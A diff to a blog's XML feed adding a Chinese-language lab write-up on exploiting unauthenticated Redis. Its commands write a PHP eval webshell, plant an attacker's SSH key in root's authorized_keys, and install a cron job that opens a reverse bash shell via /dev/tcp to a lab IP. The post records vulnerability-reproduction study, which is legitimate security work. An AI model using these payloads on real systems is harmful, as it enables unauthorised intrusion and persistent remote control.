@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>Redis未授权</title>
+    <link href="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/"/>
+    <url>/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h1><p>在kali上安装redis服务，并启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget http://download.redis.io/releases/redis-2.8.17.tar.gz  #下载压缩包<br>tar -zxvf redis-2.8.17.tar.gz  #解压<br>cd redis-2.8.17/src<br>make install   #这里必须使用sudo权限<br>cp redis-server /usr/bin<br>cp redis-cli /usr/bin<br><br>redis-server /etc/redis.conf  #启动服务<br><span class="hljs-meta prompt_">#</span><span class="language-bash">这里显示/etc下面没有redis.conf ，我直接网上下载了一个</span><br></code></pre></td></tr></table></figure><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20240307112011309.png"></p><p>在windows上连接</p><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20240307112117110.png"></p><p>也可以使用redis-cli命令连接器</p><h3 id="1、木马生成攻击"><a href="#1、木马生成攻击" class="headerlink" title="1、木马生成攻击"></a>1、木马生成攻击</h3><p>环境：</p><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20240307111651726.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">config get dir  #查看redis数据库路径<br>config set dir /root/fuxian/redis-2.8.17 #修改redies数据库路径<br>config set dbfilename shell.php  #生成shell.php文件，文件会生成在数据库路径下<br>set xxx &quot;\r\n\r\n&lt;?php eval($_POST[cmd]);?&gt;\r\n\r\n&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">将一句话木马写入shell.php</span><br>save  #保存，文件生成完成<br></code></pre></td></tr></table></figure><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20240307113155471.png"></p><p>写入成功</p><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20240307113223311.png"></p><p>我在本地写完shell.php后，无法利用，因为kali上没有开启web服务</p><blockquote><p>想要利用需要：开启web服务，并且知道路径，这样我们就可以利用url使用蚁剑进行连接</p></blockquote><h3 id="2、ssh密钥连接"><a href="#2、ssh密钥连接" class="headerlink" title="2、ssh密钥连接"></a>2、ssh密钥连接</h3><p>环境：</p><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20240308212632971.png"></p><blockquote><p>原理:</p><p>攻击机上生成ssh密钥通过redis写入到目标主机的&#x2F;root&#x2F;.ssh</p></blockquote><p>刚开始ubuntu是连不上kali的</p><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20240308233939262.png"></p><p>1、先在攻击机上生成密钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa   #生成本地密钥<br></code></pre></td></tr></table></figure><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20240308234058719.png"></p><p>2、将公钥写入到key.txt里面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">(echo -e &quot;\n&quot;;cat /home/meixiaoyi/.ssh/id_rsa.pub;echo -e &quot;\n&quot;) &gt; key.txt<br><span class="hljs-meta prompt_">#</span><span class="language-bash">这里前后都加\n是为了避免和redis其他缓存数据混合</span><br></code></pre></td></tr></table></figure><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20240308234702048.png"></p><p>3、将key.txt 文件写入redis缓存</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /home/meixiaoyi/key.txt |./redis-cli -h 192.168.198.148 -x set pub<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-x：这个选项表示后面的数据将从标准输入(stdin)中读取，并作为命令的参数传递给Redis</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">pub键名，值为key.txt里面的内容</span><br></code></pre></td></tr></table></figure><p><img src="/2024/03/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/image-20240308235310130.png"></p><p>4、设置redis的dump文件路径为&#x2F;root&#x2F;.ssh且文件名为authorized_keys</p><h3 id="3、写入定时任务"><a href="#3、写入定时任务" class="headerlink" title="3、写入定时任务"></a>3、写入定时任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.198.140/5555 0&gt;&amp;1\n\n&quot;<br><br>config set dir /var/spool/cron<br><br>config set dbfilename root<br><br>save<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>漏洞复现</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>数据库漏洞</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>test</title>
     <link href="/2024/02/16/test/"/>
     <url>/2024/02/16/test/</url>
